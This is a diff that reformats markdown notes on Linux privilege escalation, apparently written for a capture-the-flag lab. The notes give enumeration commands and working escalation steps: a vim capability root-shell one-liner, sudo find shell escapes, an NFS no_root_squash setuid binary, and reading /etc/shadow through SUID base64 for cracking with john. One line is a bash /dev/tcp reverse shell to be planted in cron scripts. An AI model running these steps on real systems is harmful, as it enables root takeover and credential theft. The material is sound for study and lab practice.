@@ -6,25 +6,25 @@ At it's core, Privilege Escalation usually involves going from a lower permissio
 
 Enumeration is the first step to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.
 
-#### hostname
+### hostname
 
 The hostname command will return the hostname of the target machine. Although htis value can easily be changed or have a relatively meaningless string (e.g. Linux-908080), in some cases, it can provide information about the target system's role within the corporate network (e.g. SQL-PROD-01 for a production SQL server) ```$hostname -A``` may provide more information.
 
-#### uname -a
+### uname -a
 
 It will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
 
-#### /proc/version
+### /proc/version
 
 The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal. Looking at ```/proc/version``` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 
-#### /etc/issue
+### /etc/issue
 
 Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always a good practice to look at all of these.
 
-#### ps command
+### ps command
 
-The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell. 
+The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
 
 The output of the ps (Process Status) will show the following.
 
@@ -39,59 +39,60 @@ The **ps** command provides a few useful options
 - ps axjf: View process tree
 - ps aux: The aux option will show process for all users (a), display the user that launched the process(u), and show processes that are not attached to a terminal (x).
 
-#### env
+### env
 
 The env command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
 
-#### sudo -l
+### sudo -l
 
 The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.
 
-#### ls
+### ls
 
 One of the common commands used in linux is probably ls. While looking for potential privilege escalation vectors, please remember to always use the ls command with -la parameter so that it will list all the files and folders including hidden ones.
 
-#### id
+### id
 
 The id command will provide a general overview of teh user's privilege level and group memberships. id command can also be used to obtained the same information for another user.
 
 The command can be like ```$id user_name```
 
-#### /etc/passwd
+### /etc/passwd
 
 Reading the /etc/passwd file can be an easy way to discover users on the system. While the output can be long and a bit intimidating, it can be easily cut and converted to a useful list for brute-force attacks ```$cat /etc/passwd | grep home | cut -d ":" -f 1```
 
-#### history
+### history
 
 Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.
 
-#### ifconfig
+### ifconfig
 
-The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. 
+The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system.
 
-#### ip route 
+### ip route
 
 ip route command will give us the information to see which network routes exist in the system.
 
-#### netstat
+### netstat
 
 The netstat command can be used with several different options to gather information on existing connections
 
 - netstat -a: shows all listening ports and established connections
 - netstat -at or netstat -au : can also be used to list TCP or UDP protocols respectively.
-- netstat -l: list ports in listening mode. These ports are open and ready to accept incoming connections. 
+- netstat -l: list ports in listening mode. These ports are open and ready to accept incoming connections.
 - netstat -tp: list connections with the service name and PID information.
 - netstat -i: shows interface statistics.
-- netstat -ano: 
-    - -a: display all sockets
-    - -n: Do not resolve names
-    - -o: Display timers
+- netstat -ano:
+  - -a: display all sockets
+  - -n: Do not resolve names
+  - -o: Display timers
 
 #### find
 
 Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in find command is useful and worth keeping in your arsenal.
 
 Some useful examples of find:
+
 ```bash
 $find . -name flag1.txt: find the finle named flag1.txt in the current directory
 $find /home -name flag1.txt: find the file names flag1.txt in the /home directory
@@ -108,6 +109,7 @@ $find / -perm 222 -type d 2>/dev/null: find world-writeable folders
 $find / -perm -o w -type d 2>/dev/null: find world-writable folders
 $find / -perm -o x -type d 2>/dev/null: find world-executable folders
 ```
+
 Find development tools and supported languages:
 
 - find / -name perl*
@@ -134,8 +136,7 @@ The kernel exploit methodology is simple;
 
 Although it looks simple, please remember that a failed kernel expoit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel expoit.
 
-
-### Research sources
+## Research sources
 
 1. Based on your findings, you can use Google to search for an existing expoit code.
 2. Sources such as [cvedetails](https://www.cvedetails.com/) can also be useful.
@@ -161,7 +162,7 @@ We have sudo without password permission in find, less, and nano binaries so let
 **SUID:** Set-User Identification
 **SGID:** Set-Group Identification
   
-To find the files with SUID or SGID permissions we can use ```find / -type f -perm -04000 -ls 2>/dev/null``` 
+To find the files with SUID or SGID permissions we can use ```find / -type f -perm -04000 -ls 2>/dev/null```
 
 It will give all the files and binaries that have SUID or SGID bits set.
 
@@ -179,7 +180,7 @@ We can use the ```getcap``` tool to list enabled capabilities.
 $getcap -r / 2>/dev/null
 ```
 
-We can see that there are 2 binaries vim and view are available with capabilities and we can exploit them with the command as 
+We can see that there are 2 binaries vim and view are available with capabilities and we can exploit them with the command as
 
 ```bash
 $./vim -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
@@ -201,14 +202,16 @@ Cron job configurations are stored as crontabs (Cron tables) to see the next tim
 
 Any user can read the file keeping system-wide cron jobs under ```/etc/crontab```
 
-```
+```bash
 * * * * * root antivirus.sh
 ```
+
 means the script antivirus.sh script will run every min. We can see that there are 2 script files we can use in our favor. (i.e. backup.sh and antivirus.sh) In any of the files we need to add a line to be able to get a reverse shell to the system with the command
 
 ```bash
 bash -i >& /dev/tcp/your_ip/port 0>&1
 ```
+
 You must check if the file has execute permission enabled or not. In our case the backup.sh doesn't have execute permission so we need to add the execute permission to it by running the command.
 
 ```bash
@@ -222,6 +225,7 @@ Now we get the reverse shell to the system and the user is root.
 If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file)
 
 First explore these
+
 1. What folders are located under $PATH
 2. Does your current user have write privileges for any of these folders?
 3. Can you modify $PATH?
@@ -245,7 +249,7 @@ So let us first find the writable directories for us we can use the command belo
 $find / -writable 2>/dev/null
 ```
 
-This will output a lot of lines which is very hard to read and get a hang of it. So, we need to cut it and then sort with unique 
+This will output a lot of lines which is very hard to read and get a hang of it. So, we need to cut it and then sort with unique
 
 ```bash
 $find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
@@ -256,6 +260,7 @@ We have seen that we have a home dir to write to let us grep it.
 ```bash
 $find / -writable 2>/dev/null | grep home | sort -u
 ```
+
 We have write access to an unusual home directory lets switch to that one. And we can see that we have 2 files there one is test and the other one is thm.py from thm.py we can see that it calls thm binary as said in the walkthrough so we need to create a bin with name thm we can simply do that by
 
 ```bash
@@ -286,12 +291,13 @@ $showmount -e target_ip
 ```
 
 We will mount one of the "no_root_squash" shares to our machine and start building our executable.
+
 ```bash
 $mkdir /tmp/norootsquashmount
 $mount -o rw target_ip:/backups /tmp/norootsquashmount
 ```
 
-We will use the c program 
+We will use the c program
 
 ```c
 int main() {
@@ -308,6 +314,7 @@ int main() {
 ```
 
 Now back on the target system we can see that both nfs.c and nfs are present
+
 ```bash
 $./nfs
 ```
@@ -322,12 +329,13 @@ Task 2: What is the content of flag2.txt
 
 First we need to enumerate the system.
 
-We find that this is a CentOS 7 server with 3.10.0 linux kernel and we couldn't find any easy to exploit kernel vulnerability. Let's read /etc/passwd file. 
+We find that this is a CentOS 7 server with 3.10.0 linux kernel and we couldn't find any easy to exploit kernel vulnerability. Let's read /etc/passwd file.
 
 ```bash
 $cat /etc/passwd | grep home
 ```
-We found 1 other user. So try to read the shadow file with ```$sudo cat /etc/shadow``` This user can't run sudo command, so we can't see the shadow file. So, let's try to find any luck with SGID or SUID. 
+
+We found 1 other user. So try to read the shadow file with ```$sudo cat /etc/shadow``` This user can't run sudo command, so we can't see the shadow file. So, let's try to find any luck with SGID or SUID.
 
 ```bash
 $find / -type f -perm -04000 -ls 2>/dev/null
@@ -338,9 +346,10 @@ We have base64 with suid bit set to it so let's read the shadow file using base6
 ```bash
 $base64 /etc/shadow | base64 -d | grep missy | cut -d ":" -f 2,3 > missy.hash
 ```
+
 Now break the hash using john. with ```$john missy.hash --wordlist=/usr/share/wordlists/rockyou.txt``` and voila we got the password
 
-Login as missy ```su - missy``` 
+Login as missy ```su - missy```
 
 Try to find any flag that is present in under missy's access level
 
@@ -348,7 +357,7 @@ Try to find any flag that is present in under missy's access level
 $find / -name flag*.txt 2>/dev/null
 ```
 
-We got a hit. Now we can read flag1.txt. Now list sudo permission for missy. ```$sudo -l``` we have got that missy can run find with sudo and doesn't require any password. So, let's break into root using find as we have got earlier 
+We got a hit. Now we can read flag1.txt. Now list sudo permission for missy. ```$sudo -l``` we have got that missy can run find with sudo and doesn't require any password. So, let's break into root using find as we have got earlier
 
 ```bash
 $sudo find . -exec /bin/bash \; -quit
